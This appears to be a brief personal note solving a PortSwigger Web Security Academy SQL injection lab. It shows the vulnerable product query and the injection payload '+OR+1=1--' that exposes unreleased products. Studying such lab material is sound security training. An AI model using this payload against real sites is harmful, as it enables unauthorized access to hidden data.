# Lab

https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data

## Query

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

## Payload

```sql
'+OR+1=1--
```